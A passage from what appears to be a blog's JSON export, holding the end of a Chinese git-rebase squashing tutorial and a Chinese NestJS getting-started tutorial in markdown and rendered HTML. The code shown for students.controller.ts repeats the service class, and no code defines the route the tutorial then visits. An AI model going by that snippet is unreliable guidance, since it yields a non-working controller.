href=\"#期望场景\" class=\"headerlink\" title=\"期望场景\"></a>期望场景</h3><p>合并commit: <code>e4a5545b</code> 和 <code>1bc8133d</code><br>git log: <code>初始化文件</code></p><h2 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h2><h3 id=\"压缩-commit-命令\"><a href=\"#压缩-commit-命令\" class=\"headerlink\" title=\"压缩 commit 命令\"></a>压缩 commit 命令</h3><p>命令：<code>git rebase -i [start point] [end point]</code> or <code>git rebase -i HEAD~[number]</code> 可使用任意一种</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rebase -i 03dcc16f // commit号是需要合并提交的前一次提交</span><br><span class=\"line\">// or </span><br><span class=\"line\">git rebase -i 03dcc16f 1bc8133d</span><br><span class=\"line\">// or</span><br><span class=\"line\">git rebase -i HEAD~2</span><br></pre></td></tr></table></figure><p>键入命令后，commit 信息由最开始到最近提交。即：最上面是最开始的提交，最下面是最近提交。<br><img src=\"/git/git-rebase-merge-commit/git-rebase-pick.png\" alt=\"git-rebase-pick\"></p><h3 id=\"Rebase\"><a href=\"#Rebase\" class=\"headerlink\" title=\"Rebase\"></a>Rebase</h3><h4 id=\"1-命令解析：\"><a href=\"#1-命令解析：\" class=\"headerlink\" title=\"1. 命令解析：\"></a>1. 命令解析：</h4><ul><li><code>pick</code>: 要执行这个 commit</li><li><code>squash</code> : 当前 commit 会被合并到前一个 commit</li><li>…</li></ul><h4 id=\"2-操作-rebase-i\"><a href=\"#2-操作-rebase-i\" class=\"headerlink\" title=\"2. 操作 rebase -i\"></a>2. 操作 rebase -i</h4><ul><li>将 <code>除了第一条</code> 的 <code>pick</code> 都改为 <code>squash</code> 或者 <code>s</code></li><li>vi <code>:wq</code> 保存退出</li></ul><p><img src=\"/git/git-rebase-merge-commit/git-rebase-s.png\" alt=\"git-rebase-s\"></p><h4 id=\"3-git-rebase-基础操作-非必要无需此步\"><a href=\"#3-git-rebase-基础操作-非必要无需此步\" class=\"headerlink\" title=\"3. git rebase 基础操作(非必要无需此步)\"></a>3. git rebase 基础操作(非必要无需此步)</h4><p>git 会压缩提交历史，若有冲突，需要进行修改，修改的时候保留最新的历史记录。</p><ul><li><p>if 执行压缩：</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git rebase --continue</span><br></pre></td></tr></table></figure></li><li><p>else 如果放弃此次压缩：</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rebase --abort</span><br></pre></td></tr></table></figure></li></ul><h4 id=\"4-修改-commit-message\"><a href=\"#4-修改-commit-message\" class=\"headerlink\" title=\"4. 修改 commit message\"></a>4. 修改 commit message</h4><p>若无冲突 or 冲突已 fix，则会出现一个 commit message 编辑页面。</p><p>修改 commit message， vi <code>:wq</code> 保存退出。</p><p><img src=\"/git/git-rebase-merge-commit/modify-commit-message.png\" alt=\"modify-commit-message\"></p><h4 id=\"5-查看修改后的内容\"><a href=\"#5-查看修改后的内容\" class=\"headerlink\" title=\"5. 查看修改后的内容\"></a>5. 查看修改后的内容</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">log</span></span><br></pre></td></tr></table></figure><p><img src=\"/git/git-rebase-merge-commit/modified-git-log.png\" alt=\"modified-git-log\"></p><p>已经将 <code>e4a5545b</code> 和 <code>1bc8133d</code> 合并成一条 <code>510bfd34</code> ✅</p><h4 id=\"6-同步到远端\"><a href=\"#6-同步到远端\" class=\"headerlink\" title=\"6. 同步到远端\"></a>6. 同步到远端</h4><p>使用 <code>git push -f</code> or <code>git push --force</code> 强制推送。</p><p>由于本地 git commit 记录被改动，与远端的记录不匹配。因此需要用 <code>force push</code> 强制远端与本地记录同步。</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push -f</span><br><span class=\"line\">// or</span><br><span class=\"line\">git push --force</span><br></pre></td></tr></table></figure><p>再看远端的仓库，记录已经改变～</p>"},{"title":"NestJs 入门教程之一：初次上手","date":"2021-09-11T15:45:27.000Z","dir":"nestJs","keywords":"NestJs 教程","_content":"自从 Node 出世以来，许多 Javascript 后端框架都曾处不穷，前端开发后台的需求也逐渐庞大。\n\n![nodejs](nodejs.png)\n\nNode 做后端已经成为前端的重要业务，随着前端业务的不断更迭，Node 也在前端领域也逐渐站稳脚跟，市场招聘需求逐渐旺盛，企业都抢着要。\n\n尽管 Node 框架已经逐渐完善，但是纯 TS 的框架却十分稀缺，国外的 NestJs 填补了这一空白。\n\n可国内使用 NestJs 的团队并不是很多，而且教程、文档都良莠不齐，对初次上手者十分不友好。恰好笔者有幸在工程中使用过 NestJs，踩过非常多的坑。本系列文章主要讲我在工作中遇到的问题与解决方案，并梳理成教程方式，希望对初学者有用。\n\n教程目标是经过此个系列文章，能搭建一套 NestJs 在日常编码过程中会用到的功能。\n\n考虑到 NestJs 功能比较多，本教程会选较为常用的功能，分为四次次连载。\n\n![nestjs](nestjs.png)\n\n# 一、NestJs 是啥\n学习 NestJS 之前，先简单说一下，它到底是啥。\n\n字面意思来讲，它是一个以 JS 代码的方式运行 JS 的框架。\n\n从 [NestJs 官网](https://nestjs.com/) 来看，NestJS 是运行在服务端的一个 JS 框架。它运行时是 `JavaScript`，编程时使用`TypeScript`, 是结合灵活性、可扩展性的框架。并且结合了面向对象编程(OOP)、函数式编程(FP)和函数响应式编程(FRP)\n\n它的特殊之处在于，以前使用 JS 方式写后台代码，现在通过写 TS, 再编译成 JS 运行。既包含了 JS 的灵活性，又有 TS 的约束。\n\n# 二、NestJS 的优势\nNestJS 最大的优势，是他基于 TypeScript。\n\n后台接口需要清晰的入参和出参，需要对函数和接口强约束，维护时才能保证接口的可靠性。\n\n而且，NestJs 的是基于 Express 的进行开发的，也就是说完美的复用成熟的生态，可以很方便的去市场找第三方包。\n\n# 三、知识准备\n由于 NestJs 是基于 Node 的环境，因此需要具备基础的知识。\n\n- HTTP: 了解基本的 Get、Post 请求\n- Node：基本明白接口请求，知道服务与接口关系即可\n- Typescript：基本懂语法，能大致知道装饰器和 interface\n\n最好之前用过 Node 相关服务，使用 Node 搭建过后台服务，但这不是必要的。\n\n# 四、开发准备\n\n1、安装 Node 环境：访问 [Node 下载地址](https://nodejs.org/en/download/). 下载安装后，Node >= 10.13.0 即可, 可通过命令行检查\n\n```bash\nnode -v \n```\n\n2、安装 NestJS cli\n\n```bash\nnpm i -g @nestjs/cli\n```\n\n# 五、Hello World\n## 创建 nest-test 项目\n```\n// step1\nnest new nest-test\n\n// step2 Which package manager would you\n选择: npm\n```\n\n## 目录结构\n这样就得到了 src/ 目录为这样的文件列表了\n```\nsrc\n  |- app.controller.spec.ts // controller 的测试文件\n  |- app.controller.ts      // controller，路由和预处理\n  |- app.module.ts          // module，为模块注册用\n  |- app.service.ts         // service 真正的逻辑\n  |- main.ts                // 程序入口\n```\nNestJS 也主张的是 [MVC](https://zh.wikipedia.org/wiki/MVC) 的格式。\n\n## module\n![module](module.png)\n\nmodule 的作用是在程序运行时给模块处理依赖。好处是所有模块的依赖都可以在 module 中清晰明了的知道引用还是被引用\n\n## controller\n![controller](controllers.png)\n\ncontroller 的作用是处理请求，所有的请求会先到 controller，再经 controller 调用其他模块业务逻辑\n\n## service\n是真正处理业务逻辑的地方，所有的业务逻辑都会在这里处理。它可经过 module 引用其他模块的service，也可经过 module 暴露出去。\n\n\n## hello-world\n```\n// step1: 进入目录\ncd nest-test\n\n// step2: 安装依赖或更新依赖\nnpm install\n\n// step3: 运行程序\nnpm run start\n```\n\n最后浏览器访问url\n\n```\n// ✅\n访问: http://localhost:3000/\n// => Hello World!  \n```\n说明程序已经成功访问了！\n\n# 六、生成新模块\n\n## 执行命令\n能访问新模块了，再进一步期望生成文件夹和文件夹的模块。NestJS cli 也支持用命令行形式来创建，这样就不需要做重复的创建文件的动作了。\n```\nnest g controller students\nnest g service students\nnest g module students\n```\n\n## 目录结构\n再命令行分别执行以上三条命令，src/ 目录变成了如下样子\n```\nsrc\n  |- app.controller.spec.ts\n  |- app.controller.ts     \n  |- app.module.ts         \n  |- app.service.ts        \n  |- main.ts               \n  |- students/\n        |- students.controller.spec.ts\n        |- students.controller.ts     \n        |- students.module.ts         \n        |- students.service.spec.ts\n        |- students.service.ts        \n```\n\n## 编辑文件\n编辑如下文件:\n```typescript\n// students.service.ts\nimport { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    ImStudent() {\n        return 'Im student';\n    }\n}\n```\n\n```typescript\n// students.controller.ts\nimport { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    ImStudent() {\n        return 'Im student';\n    }\n}\n```\n\n重启服务, 加上 dev 就能监听文件修改了。\n```bash\nnpm run start:dev\n```\n\n最后浏览器访问url\n\n```bash\n// ✅\nhttp://localhost:3000/students/who-are-you\n// => Im student  \n```\n\n这样模块添加完成了\n\n如果你看到了这里，说明你真的对 NestJS 很感兴趣。{% post_link nest-js-tutorial-2 下章 %}将会对接口再深入细化。\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到\n","source":"_posts/nest-js-tutorial-1.md","raw":"---\ntitle: NestJs 入门教程之一：初次上手\ndate: 2021-09-11 23:45:27\ntags:\n    - javascript\n    - typescript\n    - nestJs\ndir: nestJs\nkeywords: NestJs 教程\n---\n自从 Node 出世以来，许多 Javascript 后端框架都曾处不穷，前端开发后台的需求也逐渐庞大。\n\n![nodejs](nodejs.png)\n\nNode 做后端已经成为前端的重要业务，随着前端业务的不断更迭，Node 也在前端领域也逐渐站稳脚跟，市场招聘需求逐渐旺盛，企业都抢着要。\n\n尽管 Node 框架已经逐渐完善，但是纯 TS 的框架却十分稀缺，国外的 NestJs 填补了这一空白。\n\n可国内使用 NestJs 的团队并不是很多，而且教程、文档都良莠不齐，对初次上手者十分不友好。恰好笔者有幸在工程中使用过 NestJs，踩过非常多的坑。本系列文章主要讲我在工作中遇到的问题与解决方案，并梳理成教程方式，希望对初学者有用。\n\n教程目标是经过此个系列文章，能搭建一套 NestJs 在日常编码过程中会用到的功能。\n\n考虑到 NestJs 功能比较多，本教程会选较为常用的功能，分为四次次连载。\n\n![nestjs](nestjs.png)\n\n# 一、NestJs 是啥\n学习 NestJS 之前，先简单说一下，它到底是啥。\n\n字面意思来讲，它是一个以 JS 代码的方式运行 JS 的框架。\n\n从 [NestJs 官网](https://nestjs.com/) 来看，NestJS 是运行在服务端的一个 JS 框架。它运行时是 `JavaScript`，编程时使用`TypeScript`, 是结合灵活性、可扩展性的框架。并且结合了面向对象编程(OOP)、函数式编程(FP)和函数响应式编程(FRP)\n\n它的特殊之处在于，以前使用 JS 方式写后台代码，现在通过写 TS, 再编译成 JS 运行。既包含了 JS 的灵活性，又有 TS 的约束。\n\n# 二、NestJS 的优势\nNestJS 最大的优势，是他基于 TypeScript。\n\n后台接口需要清晰的入参和出参，需要对函数和接口强约束，维护时才能保证接口的可靠性。\n\n而且，NestJs 的是基于 Express 的进行开发的，也就是说完美的复用成熟的生态，可以很方便的去市场找第三方包。\n\n# 三、知识准备\n由于 NestJs 是基于 Node 的环境，因此需要具备基础的知识。\n\n- HTTP: 了解基本的 Get、Post 请求\n- Node：基本明白接口请求，知道服务与接口关系即可\n- Typescript：基本懂语法，能大致知道装饰器和 interface\n\n最好之前用过 Node 相关服务，使用 Node 搭建过后台服务，但这不是必要的。\n\n# 四、开发准备\n\n1、安装 Node 环境：访问 [Node 下载地址](https://nodejs.org/en/download/). 下载安装后，Node >= 10.13.0 即可, 可通过命令行检查\n\n```bash\nnode -v \n```\n\n2、安装 NestJS cli\n\n```bash\nnpm i -g @nestjs/cli\n```\n\n# 五、Hello World\n## 创建 nest-test 项目\n```\n// step1\nnest new nest-test\n\n// step2 Which package manager would you\n选择: npm\n```\n\n## 目录结构\n这样就得到了 src/ 目录为这样的文件列表了\n```\nsrc\n  |- app.controller.spec.ts // controller 的测试文件\n  |- app.controller.ts      // controller，路由和预处理\n  |- app.module.ts          // module，为模块注册用\n  |- app.service.ts         // service 真正的逻辑\n  |- main.ts                // 程序入口\n```\nNestJS 也主张的是 [MVC](https://zh.wikipedia.org/wiki/MVC) 的格式。\n\n## module\n![module](module.png)\n\nmodule 的作用是在程序运行时给模块处理依赖。好处是所有模块的依赖都可以在 module 中清晰明了的知道引用还是被引用\n\n## controller\n![controller](controllers.png)\n\ncontroller 的作用是处理请求，所有的请求会先到 controller，再经 controller 调用其他模块业务逻辑\n\n## service\n是真正处理业务逻辑的地方，所有的业务逻辑都会在这里处理。它可经过 module 引用其他模块的service，也可经过 module 暴露出去。\n\n\n## hello-world\n```\n// step1: 进入目录\ncd nest-test\n\n// step2: 安装依赖或更新依赖\nnpm install\n\n// step3: 运行程序\nnpm run start\n```\n\n最后浏览器访问url\n\n```\n// ✅\n访问: http://localhost:3000/\n// => Hello World!  \n```\n说明程序已经成功访问了！\n\n# 六、生成新模块\n\n## 执行命令\n能访问新模块了，再进一步期望生成文件夹和文件夹的模块。NestJS cli 也支持用命令行形式来创建，这样就不需要做重复的创建文件的动作了。\n```\nnest g controller students\nnest g service students\nnest g module students\n```\n\n## 目录结构\n再命令行分别执行以上三条命令，src/ 目录变成了如下样子\n```\nsrc\n  |- app.controller.spec.ts\n  |- app.controller.ts     \n  |- app.module.ts         \n  |- app.service.ts        \n  |- main.ts               \n  |- students/\n        |- students.controller.spec.ts\n        |- students.controller.ts     \n        |- students.module.ts         \n        |- students.service.spec.ts\n        |- students.service.ts        \n```\n\n## 编辑文件\n编辑如下文件:\n```typescript\n// students.service.ts\nimport { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    ImStudent() {\n        return 'Im student';\n    }\n}\n```\n\n```typescript\n// students.controller.ts\nimport { Injectable } from '@nestjs/common';\n\n@Injectable()\nexport class StudentsService {\n    ImStudent() {\n        return 'Im student';\n    }\n}\n```\n\n重启服务, 加上 dev 就能监听文件修改了。\n```bash\nnpm run start:dev\n```\n\n最后浏览器访问url\n\n```bash\n// ✅\nhttp://localhost:3000/students/who-are-you\n// => Im student  \n```\n\n这样模块添加完成了\n\n如果你看到了这里，说明你真的对 NestJS 很感兴趣。{% post_link nest-js-tutorial-2 下章 %}将会对接口再深入细化。\n\n完整示例可以在 [github](https://github.com/gdccwxx/nest-test) 找到\n","slug":"nest-js-tutorial-1","published":1,"updated":"2021-10-13T15:49:19.692Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz04000p4jzxay8zguei","content":"<p>自从 Node 出世以来，许多 Javascript 后端框架都曾处不穷，前端开发后台的需求也逐渐庞大。</p><p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-1/nodejs.png\" alt=\"nodejs\"></p><p>Node 做后端已经成为前端的重要业务，随着前端业务的不断更迭，Node 也在前端领域也逐渐站稳脚跟，市场招聘需求逐渐旺盛，企业都抢着要。</p><p>尽管 Node 框架已经逐渐完善，但是纯 TS 的框架却十分稀缺，国外的 NestJs 填补了这一空白。</p><p>可国内使用 NestJs 的团队并不是很多，而且教程、文档都良莠不齐，对初次上手者十分不友好。恰好笔者有幸在工程中使用过 NestJs，踩过非常多的坑。本系列文章主要讲我在工作中遇到的问题与解决方案，并梳理成教程方式，希望对初学者有用。</p><p>教程目标是经过此个系列文章，能搭建一套 NestJs 在日常编码过程中会用到的功能。</p><p>考虑到 NestJs 功能比较多，本教程会选较为常用的功能，分为四次次连载。</p><p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-1/nestjs.png\" alt=\"nestjs\"></p><h1 id=\"一、NestJs-是啥\"><a href=\"#一、NestJs-是啥\" class=\"headerlink\" title=\"一、NestJs 是啥\"></a>一、NestJs 是啥</h1><p>学习 NestJS 之前，先简单说一下，它到底是啥。</p><p>字面意思来讲，它是一个以 JS 代码的方式运行 JS 的框架。</p><p>从 <a href=\"https://nestjs.com/\" target=\"_blank\" rel=\"noopener\">NestJs 官网</a> 来看，NestJS 是运行在服务端的一个 JS 框架。它运行时是 <code>JavaScript</code>，编程时使用<code>TypeScript</code>, 是结合灵活性、可扩展性的框架。并且结合了面向对象编程(OOP)、函数式编程(FP)和函数响应式编程(FRP)</p><p>它的特殊之处在于，以前使用 JS 方式写后台代码，现在通过写 TS, 再编译成 JS 运行。既包含了 JS 的灵活性，又有 TS 的约束。</p><h1 id=\"二、NestJS-的优势\"><a href=\"#二、NestJS-的优势\" class=\"headerlink\" title=\"二、NestJS 的优势\"></a>二、NestJS 的优势</h1><p>NestJS 最大的优势，是他基于 TypeScript。</p><p>后台接口需要清晰的入参和出参，需要对函数和接口强约束，维护时才能保证接口的可靠性。</p><p>而且，NestJs 的是基于 Express 的进行开发的，也就是说完美的复用成熟的生态，可以很方便的去市场找第三方包。</p><h1 id=\"三、知识准备\"><a href=\"#三、知识准备\" class=\"headerlink\" title=\"三、知识准备\"></a>三、知识准备</h1><p>由于 NestJs 是基于 Node 的环境，因此需要具备基础的知识。</p><ul><li>HTTP: 了解基本的 Get、Post 请求</li><li>Node：基本明白接口请求，知道服务与接口关系即可</li><li>Typescript：基本懂语法，能大致知道装饰器和 interface</li></ul><p>最好之前用过 Node 相关服务，使用 Node 搭建过后台服务，但这不是必要的。</p><h1 id=\"四、开发准备\"><a href=\"#四、开发准备\" class=\"headerlink\" title=\"四、开发准备\"></a>四、开发准备</h1><p>1、安装 Node 环境：访问 <a href=\"https://nodejs.org/en/download/\" target=\"_blank\" rel=\"noopener\">Node 下载地址</a>. 下载安装后，Node &gt;= 10.13.0 即可, 可通过命令行检查</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node -v</span><br></pre></td></tr></table></figure><p>2、安装 NestJS cli</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm i -g @nestjs/cli</span><br></pre></td></tr></table></figure><h1 id=\"五、Hello-World\"><a href=\"#五、Hello-World\" class=\"headerlink\" title=\"五、Hello World\"></a>五、Hello World</h1><h2 id=\"创建-nest-test-项目\"><a href=\"#创建-nest-test-项目\" class=\"headerlink\" title=\"创建 nest-test 项目\"></a>创建 nest-test 项目</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// step1</span><br><span class=\"line\">nest new nest-test</span><br><span class=\"line\"></span><br><span class=\"line\">// step2 Which package manager would you</span><br><span class=\"line\">选择: npm</span><br></pre></td></tr></table></figure><h2 id=\"目录结构\"><a href=\"#目录结构\" class=\"headerlink\" title=\"目录结构\"></a>目录结构</h2><p>这样就得到了 src/ 目录为这样的文件列表了<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src</span><br><span class=\"line\">  |- app.controller.spec.ts // controller 的测试文件</span><br><span class=\"line\">  |- app.controller.ts      // controller，路由和预处理</span><br><span class=\"line\">  |- app.module.ts          // module，为模块注册用</span><br><span class=\"line\">  |- app.service.ts         // service 真正的逻辑</span><br><span class=\"line\">  |- main.ts                // 程序入口</span><br></pre></td></tr></table></figure><p></p><p>NestJS 也主张的是 <a href=\"https://zh.wikipedia.org/wiki/MVC\" target=\"_blank\" rel=\"noopener\">MVC</a> 的格式。</p><h2 id=\"module\"><a href=\"#module\" class=\"headerlink\" title=\"module\"></a>module</h2><p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-1/module.png\" alt=\"module\"></p><p>module 的作用是在程序运行时给模块处理依赖。好处是所有模块的依赖都可以在 module 中清晰明了的知道引用还是被引用</p><h2 id=\"controller\"><a href=\"#controller\" class=\"headerlink\" title=\"controller\"></a>controller</h2><p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-1/controllers.png\" alt=\"controller\"></p><p>controller 的作用是处理请求，所有的请求会先到 controller，再经 controller 调用其他模块业务逻辑</p><h2 id=\"service\"><a href=\"#service\" class=\"headerlink\" title=\"service\"></a>service</h2><p>是真正处理业务逻辑的地方，所有的业务逻辑都会在这里处理。它可经过 module 引用其他模块的service，也可经过 module 暴露出去。</p><h2 id=\"hello-world\"><a href=\"#hello-world\" class=\"headerlink\" title=\"hello-world\"></a>hello-world</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// step1: 进入目录</span><br><span class=\"line\">cd nest-test</span><br><span class=\"line\"></span><br><span class=\"line\">// step2: 安装依赖或更新依赖</span><br><span class=\"line\">npm install</span><br><span class=\"line\"></span><br><span class=\"line\">// step3: 运行程序</span><br><span class=\"line\">npm run start</span><br></pre></td></tr></table></figure><p>最后浏览器访问url</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">访问: http://localhost:3000/</span><br><span class=\"line\">// =&gt; Hello World!</span><br></pre></td></tr></table></figure><p>说明程序已经成功访问了！</p><h1 id=\"六、生成新模块\"><a href=\"#六、生成新模块\" class=\"headerlink\" title=\"六、生成新模块\"></a>六、生成新模块</h1><h2 id=\"执行命令\"><a href=\"#执行命令\" class=\"headerlink\" title=\"执行命令\"></a>执行命令</h2><p>能访问新模块了，再进一步期望生成文件夹和文件夹的模块。NestJS cli 也支持用命令行形式来创建，这样就不需要做重复的创建文件的动作了。<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nest g controller students</span><br><span class=\"line\">nest g service students</span><br><span class=\"line\">nest g module students</span><br></pre></td></tr></table></figure><p></p><h2 id=\"目录结构-1\"><a href=\"#目录结构-1\" class=\"headerlink\" title=\"目录结构\"></a>目录结构</h2><p>再命令行分别执行以上三条命令，src/ 目录变成了如下样子<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">src</span><br><span class=\"line\">  |- app.controller.spec.ts</span><br><span class=\"line\">  |- app.controller.ts     </span><br><span class=\"line\">  |- app.module.ts         </span><br><span class=\"line\">  |- app.service.ts        </span><br><span class=\"line\">  |- main.ts               </span><br><span class=\"line\">  |- students/</span><br><span class=\"line\">        |- students.controller.spec.ts</span><br><span class=\"line\">        |- students.controller.ts     </span><br><span class=\"line\">        |- students.module.ts         </span><br><span class=\"line\">        |- students.service.spec.ts</span><br><span class=\"line\">        |- students.service.ts</span><br></pre></td></tr></table></figure><p></p><h2 id=\"编辑文件\"><a href=\"#编辑文件\" class=\"headerlink\" title=\"编辑文件\"></a>编辑文件</h2><p>编辑如下文件:<br></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.service.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    ImStudent() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Im student'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsService &#123;</span><br><span class=\"line\">    ImStudent() &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Im student'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>重启服务, 加上 dev 就能监听文件修改了。<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm run start:dev</span><br></pre></td></tr></table></figure><p></p><p>最后浏览器访问url</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">http://localhost:3000/students/who-are-you</span><br><span class=\"line\">// =&gt; Im student</span><br></pre></td></tr></table></figure><p>这样模块添加完成了</p><p>如果你看到了这里，说明你真的对 NestJS 很感兴趣。<a href=\"/nestJs/nest-js-tutorial-2/\" title=\"下章\">下章</a>将会对接口再深入细化。</p><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到</p>","site":{"data":{}},"excerpt":"","more":"<p>自从 Node 出世以来，许多 Javascript 后端框架都曾处不穷，前端开发后台的需求也逐渐庞大。</p><p><img src=\"/nestJs/nest-js-tutorial-1/nodejs.png\" alt=\"nodejs\"></p><p>Node 做后端已经成为前端的重要业务，随着前端业务的不断更迭，Node 也在前端领域也逐渐站稳脚跟，市场招聘需求逐渐旺盛，企业都抢着要。</p><p>尽管 Node 框架已经逐渐完善，但是纯 TS 的框架却十分稀缺，国外的 NestJs 填补了这一空白。</p><p>可国内使用 NestJs 的团队并不是很多，而且教程、文档都良莠不齐，对初次上手者十分不友好。恰好笔者有幸在工程中使用过 NestJs，踩过非常多的坑。本系列文章主要讲我在工作中遇到的问题与解决方案，并梳理成教程方式，希望对初学者有用。</p><p>教程目标是经过此个系列文章，能搭建一套 NestJs 在日常编码过程中会用到的功能。</p><p>考虑到 NestJs 功能比较多，本教程会选较为常用的功能，分为四次次连载。</p><p><img src=\"/nestJs/nest-js-tutorial-1/nestjs.png\" alt=\"nestjs\"></p><h1 id=\"一、NestJs-是啥\"><a href=\"#一、NestJs-是啥\" class=\"headerlink\" title=\"一、NestJs 是啥\"></a>一、NestJs 是啥</h1><p>学习 NestJS 之前，先简单说一下，它到底是啥。</p><p>字面意思来讲，它是一个以 JS 代码的方式运行 JS 的框架。</p><p>从 <a href=\"https://nestjs.com/\" target=\"_blank\" rel=\"noopener\">NestJs 官网</a> 来看，NestJS 是运行在服务端的一个 JS 框架。它运行时是 <code>JavaScript</code>，编程时使用<code>TypeScript</code>, 是结合灵活性、可扩展性的框架。并且结合了面向对象编程(OOP)、函数式编程(FP)和函数响应式编程(FRP)</p><p>它的特殊之处在于，以前使用 JS 方式写后台代码，现在通过写 TS, 再编译成 JS 运行。既包含了 JS 的灵活性，又有 TS 的约束。</p><h1 id=\"二、NestJS-的优势\"><a href=\"#二、NestJS-的优势\" class=\"headerlink\" title=\"二、NestJS 的优势\"></a>二、NestJS 的优势</h1><p>NestJS 最大的优势，是他基于 TypeScript。</p><p>后台接口需要清晰的入参和出参，需要对函数和接口强约束，维护时才能保证接口的可靠性。</p><p>而且，NestJs 的是基于 Express 的进行开发的，也就是说完美的复用成熟的生态，可以很方便的去市场找第三方包。</p><h1 id=\"三、知识准备\"><a href=\"#三、知识准备\" class=\"headerlink\" 